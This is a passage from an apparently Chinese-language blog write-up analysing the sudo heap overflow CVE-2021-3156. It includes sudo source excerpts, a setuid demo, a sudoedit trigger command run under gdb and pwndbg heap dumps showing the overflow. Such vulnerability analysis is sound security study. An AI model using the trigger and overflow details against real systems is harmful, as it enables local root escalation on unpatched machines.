class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;更改可执行文件的用户和组</span><br><span class=\"line\">sudo chown root:root demo</span><br><span class=\"line\">sudo chmod u+s demo</span><br></pre></td></tr></table></figure>\n<p>提权成功</p>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412152923698-1618586880599.png\" alt=\"image-20210412152923698\"></p>\n<p>首先这个可执行文件的其他用户权限是r-x，这意味着这个文件普通用户cyberangel也可以执行；当程序开始执行时，由于程序的拥有者的UID和GID均为root，因此在执行setuid和setgid后就可以拥有root权限</p>\n<blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;<span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\">&gt;<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">setuid</span><span class=\"params\">(<span class=\"keyword\">uid_t</span> uid)</span></span>;</span><br><span class=\"line\">&gt;<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">setgid</span><span class=\"params\">(gid_ gid)</span></span>;</span><br></pre></td></tr></table></figure>\n<p>下面我们以更改用户ID为例（关于用户ID我们所说明的一切也适用于组ID）：</p>\n<p>①若进程具有超级用户特权，则setuid函数将实际用户ID、有效用户ID、保存的设置用户ID设置为uid</p>\n<p>②若进程没有超级用户特权，则uid等于实际用户ID或保存的设置用户ID，则setuid只将有效用户ID设置为uid。不更改实际用户ID和保存的设置用户ID</p>\n<p>③如果上面两个条件都不满足，则errno设置为EPERM，并返回-1</p>\n</blockquote>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/1612582920135-dfc2a463-5fa9-43b7-8d25-176a208a72da-1618586880599.png\" alt=\"image.png\"></p>\n<h1 id=\"0x06-漏洞分析\"><a href=\"#0x06-漏洞分析\" class=\"headerlink\" title=\"0x06 漏洞分析\"></a>0x06 漏洞分析</h1><p>以sudo-1.8.21p2分析</p>\n<h2 id=\"1-漏洞定位\"><a href=\"#1-漏洞定位\" class=\"headerlink\" title=\"1. 漏洞定位\"></a>1. 漏洞定位</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb --args sudoedit -s &#39;\\&#39; aabbccddeeffgghhiiggkkllmmnn</span><br><span class=\"line\">cd &#x2F;home&#x2F;cyberangel&#x2F;Desktop&#x2F;sudo-1.8.21p2&#x2F;plugins&#x2F;sudoers</span><br></pre></td></tr></table></figure>\n<p><code>/sudo-1.8.21p2/build/plugins/sudoers/sudoers.c：852</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* set user_args */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (NewArgc &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *to, *from, **av;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> <span class=\"built_in\">size</span>, n;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Alloc and build up user_args. */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"built_in\">size</span> = <span class=\"number\">0</span>, av = NewArgv + <span class=\"number\">1</span>; *av; av++)</span><br><span class=\"line\">\t<span class=\"built_in\">size</span> += <span class=\"built_in\">strlen</span>(*av) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">size</span> == <span class=\"number\">0</span> || (user_args = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>)) == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\tsudo_warnx(U_(<span class=\"string\">\"%s: %s\"</span>), __func__, U_(<span class=\"string\">\"unable to allocate memory\"</span>));</span><br><span class=\"line\">\tdebug_return_int(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * When running a command via a shell, the sudo front-end</span></span><br><span class=\"line\"><span class=\"comment\">\t * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class=\"line\"><span class=\"comment\">\t * for sudoers matching and logging purposes.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (to = user_args, av = NewArgv + <span class=\"number\">1</span>; (from = *av); av++) &#123;</span><br><span class=\"line\">\t    <span class=\"keyword\">while</span> (*from) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (from[<span class=\"number\">0</span>] == <span class=\"string\">'\\\\'</span> &amp;&amp; !<span class=\"built_in\">isspace</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)from[<span class=\"number\">1</span>]))</span><br><span class=\"line\">\t\t    from++;</span><br><span class=\"line\">\t\t*to++ = *from++;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t    *to++ = <span class=\"string\">' '</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*--to = <span class=\"string\">'\\0'</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (to = user_args, av = NewArgv + <span class=\"number\">1</span>; *av; av++) &#123;</span><br><span class=\"line\">\t    n = strlcpy(to, *av, <span class=\"built_in\">size</span> - (to - user_args));</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (n &gt;= <span class=\"built_in\">size</span> - (to - user_args)) &#123;</span><br><span class=\"line\">\t\tsudo_warnx(U_(<span class=\"string\">\"internal error, %s overflow\"</span>), __func__);</span><br><span class=\"line\">\t\tdebug_return_int(<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t    to += n;</span><br><span class=\"line\">\t    *to++ = <span class=\"string\">' '</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*--to = <span class=\"string\">'\\0'</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>直接上动调，这里主要关注sudo_mode</p>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412172250144-1618586880599.png\" alt=\"image-20210412172250144\"></p>\n<p><code>/src/sudo.c:193</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo_mode = parse_args(argc, argv, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);</span><br><span class=\"line\">sudo_debug_printf(SUDO_DEBUG_DEBUG, <span class=\"string\">\"sudo_mode %d\"</span>, sudo_mode);</span><br></pre></td></tr></table></figure>\n<p><code>/src/parse_args.c:528</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;\t<span class=\"comment\">//检查是否开启 MODE_SHELL</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> **av, *cmnd = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> ac = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (argc != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* shell -c \"command\" */</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *src, *dst;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> cmnd_size = (<span class=\"keyword\">size_t</span>) (argv[argc - <span class=\"number\">1</span>] - argv[<span class=\"number\">0</span>]) +</span><br><span class=\"line\">\t<span class=\"built_in\">strlen</span>(argv[argc - <span class=\"number\">1</span>]) + <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    cmnd = dst = reallocarray(<span class=\"literal\">NULL</span>, cmnd_size, <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cmnd == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\tsudo_fatalx(U_(<span class=\"string\">\"%s: %s\"</span>), __func__, U_(<span class=\"string\">\"unable to allocate memory\"</span>));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (av = argv; *av != <span class=\"literal\">NULL</span>; av++) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (src = *av; *src != <span class=\"string\">'\\0'</span>; src++) &#123;</span><br><span class=\"line\">\t    <span class=\"comment\">/* quote potential meta characters */</span></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (!<span class=\"built_in\">isalnum</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)*src) &amp;&amp; *src != <span class=\"string\">'_'</span> &amp;&amp; *src != <span class=\"string\">'-'</span> &amp;&amp; *src != <span class=\"string\">'$'</span>)</span><br><span class=\"line\">\t\t*dst++ = <span class=\"string\">'\\\\'</span>;\t<span class=\"comment\">//添加反斜杠</span></span><br><span class=\"line\">\t    *dst++ = *src;\t<span class=\"comment\">//原参数</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*dst++ = <span class=\"string\">' '</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cmnd != dst)</span><br><span class=\"line\">\tdst--;  <span class=\"comment\">/* replace last space with a NUL */</span></span><br><span class=\"line\">    *dst = <span class=\"string\">'\\0'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    ac += <span class=\"number\">2</span>;<span class=\"comment\">/* -c cmnd */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过代码第一行看出，只有当mode设置了MODE_RUN 和flags设置了 MODE_SHELL 标志后，程序才会进入到内部执行，同时在一些特殊字符前面加上反斜杠来转义。<br>而要设置标志，则可以通过在程序运行时添加参数来达到，在运行sudo程序的时候设置<code>-s</code>或<code>-i</code>参数，则在parse_args函数中将会同时MODE_RUN和MODE_SHELL标志</p>\n<p><code>/src/parse_args.c:234</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">'i'</span>:</span><br><span class=\"line\">    sudo_settings[ARG_LOGIN_SHELL].value = <span class=\"string\">\"true\"</span>;</span><br><span class=\"line\">    SET(flags, MODE_LOGIN_SHELL);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">'s'</span>:</span><br><span class=\"line\">    sudo_settings[ARG_USER_SHELL].value = <span class=\"string\">\"true\"</span>;</span><br><span class=\"line\">    SET(flags, MODE_SHELL);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure>\n<p><code>/src/sudo.h</code></p>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412173759464-1618586880599.png\" alt=\"image-20210412173759464\"></p>\n<p><strong>sudo_mode是由MODE_EDIT和MODE_SHELL决定的，具有唯一性。</strong></p>\n<p>使用 <code>sudoedit</code>。原因在于如果使用 <code>sudoedit</code>，其还是会被软链接到使用 <code>sudo</code>命令，但是在 <code>parse_args()</code>函数中会自动设置 <code>MODE_EDIT</code>和不会重置 <code>valid_flags</code>，则 <code>MODE_SHELL</code>仍然在 <code>valid_flags</code>中 ，而且不会设置 <code>MODE_RUN</code>,这样就能跳过 <code>parse_args()</code>函数中转义参数的部分，同时满足 <code>set_cmnd()</code>函数中漏洞触发的部分。</p>\n<p>继续动调</p>\n<p>从一开始分析，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* set user_args */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (NewArgc &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *to, *from, **av;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> <span class=\"built_in\">size</span>, n;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Alloc and build up user_args. */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"built_in\">size</span> = <span class=\"number\">0</span>, av = NewArgv + <span class=\"number\">1</span>; *av; av++)</span><br><span class=\"line\">\t<span class=\"built_in\">size</span> += <span class=\"built_in\">strlen</span>(*av) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">size</span> == <span class=\"number\">0</span> || (user_args = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>)) == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\tsudo_warnx(U_(<span class=\"string\">\"%s: %s\"</span>), __func__, U_(<span class=\"string\">\"unable to allocate memory\"</span>));</span><br><span class=\"line\">\tdebug_return_int(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">/*\t//检查是否开启 MODE_SHELL或MODE_LOGIN_SHELL</span></span><br><span class=\"line\"><span class=\"comment\">\t * When running a command via a shell, the sudo front-end</span></span><br><span class=\"line\"><span class=\"comment\">\t * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class=\"line\"><span class=\"comment\">\t * for sudoers matching and logging purposes.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (to = user_args, av = NewArgv + <span class=\"number\">1</span>; (from = *av); av++) &#123;</span><br><span class=\"line\">\t    <span class=\"keyword\">while</span> (*from) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (from[<span class=\"number\">0</span>] == <span class=\"string\">'\\\\'</span> &amp;&amp; !<span class=\"built_in\">isspace</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)from[<span class=\"number\">1</span>]))</span><br><span class=\"line\">\t\t    from++;</span><br><span class=\"line\">\t\t*to++ = *from++;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t    *to++ = <span class=\"string\">' '</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*--to = <span class=\"string\">'\\0'</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (to = user_args, av = NewArgv + <span class=\"number\">1</span>; *av; av++) &#123;</span><br><span class=\"line\">\t    n = strlcpy(to, *av, <span class=\"built_in\">size</span> - (to - user_args));</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (n &gt;= <span class=\"built_in\">size</span> - (to - user_args)) &#123;</span><br><span class=\"line\">\t\tsudo_warnx(U_(<span class=\"string\">\"internal error, %s overflow\"</span>), __func__);</span><br><span class=\"line\">\t\tdebug_return_int(<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t    to += n;</span><br><span class=\"line\">\t    *to++ = <span class=\"string\">' '</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*--to = <span class=\"string\">'\\0'</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>先看NewArgv</p>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412180614988-1618586880599.png\" alt=\"image-20210412180614988\"></p>\n<p>可以看到我们的参数，观察函数调用栈，<code>sudoers_policy_main</code>里面定义了NewArgv</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    * Make a local copy of argc/argv, with special handling</span></span><br><span class=\"line\"><span class=\"comment\">    * for pseudo-commands and the '-i' option.</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (argc == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">NewArgc = <span class=\"number\">1</span>;</span><br><span class=\"line\">   <span class=\"comment\">//分配堆数组</span></span><br><span class=\"line\">NewArgv = reallocarray(<span class=\"literal\">NULL</span>, NewArgc + <span class=\"number\">1</span>, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span> *));</span><br><span class=\"line\"><span class=\"keyword\">if</span> (NewArgv == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">    sudo_warnx(U_(<span class=\"string\">\"%s: %s\"</span>), __func__, U_(<span class=\"string\">\"unable to allocate memory\"</span>));</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> done;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">NewArgv[<span class=\"number\">0</span>] = user_cmnd;</span><br><span class=\"line\">NewArgv[<span class=\"number\">1</span>] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">   &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"><span class=\"comment\">/* Must leave an extra slot before NewArgv for bash's --login */</span></span><br><span class=\"line\">NewArgc = argc;</span><br><span class=\"line\">NewArgv = reallocarray(<span class=\"literal\">NULL</span>, NewArgc + <span class=\"number\">2</span>, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span> *));</span><br><span class=\"line\"><span class=\"keyword\">if</span> (NewArgv == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">    sudo_warnx(U_(<span class=\"string\">\"%s: %s\"</span>), __func__, U_(<span class=\"string\">\"unable to allocate memory\"</span>));</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> done;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(++NewArgv, argv, argc * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span> *));</span><br><span class=\"line\">NewArgv[NewArgc] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (ISSET(sudo_mode, MODE_LOGIN_SHELL) &amp;&amp; runas_pw != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">    NewArgv[<span class=\"number\">0</span>] = strdup(runas_pw-&gt;pw_shell);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (NewArgv[<span class=\"number\">0</span>] == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\tsudo_warnx(U_(<span class=\"string\">\"%s: %s\"</span>), __func__, U_(<span class=\"string\">\"unable to allocate memory\"</span>));</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(NewArgv);</span><br><span class=\"line\">\t<span class=\"keyword\">goto</span> done;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>继续看上面的,size为2+28+1=31</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"keyword\">for</span> (<span class=\"built_in\">size</span> = <span class=\"number\">0</span>, av = NewArgv + <span class=\"number\">1</span>; *av; av++)</span><br><span class=\"line\"><span class=\"built_in\">size</span> += <span class=\"built_in\">strlen</span>(*av) + <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>看漏洞点</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (to = user_args, av = NewArgv + <span class=\"number\">1</span>; (from = *av); av++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (*from) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (from[<span class=\"number\">0</span>] == <span class=\"string\">'\\\\'</span> &amp;&amp; !<span class=\"built_in\">isspace</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)from[<span class=\"number\">1</span>]))</span><br><span class=\"line\">\t    from++;</span><br><span class=\"line\">\t*to++ = *from++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *to++ = <span class=\"string\">' '</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">*--to = <span class=\"string\">'\\0'</span>;</span><br></pre></td></tr></table></figure>\n<p>这里直接下断点,看to中的内容</p>\n<p>造成了堆溢出</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">8</span>s <span class=\"number\">0x555555786650</span></span><br><span class=\"line\"><span class=\"number\">0x555555786650</span>:\t<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"number\">0x555555786651</span>:\t<span class=\"string\">\"aabbccddeeffgghhiiggkkllmmnn aabbccddeeffgghhiiggkkllmmnn \\367\\377\\177\"</span></span><br><span class=\"line\"><span class=\"number\">0x55555578668f</span>:\t<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"number\">0x555555786690</span>:\t<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"number\">0x555555786691</span>:\t<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"number\">0x555555786692</span>:\t<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"number\">0x555555786693</span>:\t<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"number\">0x555555786694</span>:\t<span class=\"string\">\"\"</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx <span class=\"number\">0x555555786650</span><span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">0x555555786640</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000031</span>\t==&gt;chunk <span class=\"built_in\">size</span></span><br><span class=\"line\"><span class=\"number\">0x555555786650</span>:\t<span class=\"number\">0x6463636262616100</span>\t<span class=\"number\">0x6867676666656564</span></span><br><span class=\"line\"><span class=\"number\">0x555555786660</span>:\t<span class=\"number\">0x6c6b6b6767696968</span>\t<span class=\"number\">0x6161206e6e6d6d6c</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0x555555786670</span>:\t<span class=\"number\">0x6565646463636262</span>\t<span class=\"number\">0x6969686867676666</span>  ==&gt;chunk <span class=\"built_in\">size</span>  </span><br><span class=\"line\"><span class=\"number\">0x555555786680</span>:\t<span class=\"number\">0x6d6d6c6c6b6b6767</span>\t<span class=\"number\">0x00007ffff7206e6e</span></span><br><span class=\"line\"><span class=\"number\">0x555555786690</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866a0</span>:\t<span class=\"number\">0x7420656c69662073</span>\t<span class=\"number\">0x656c62616e65206f</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866b0</span>:\t<span class=\"number\">0x7369687420230a20</span>\t<span class=\"number\">0x6f6974636e756620</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866c0</span>:\t<span class=\"number\">0x66207974696c616e</span>\t<span class=\"number\">0x747369786520726f</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866d0</span>:\t<span 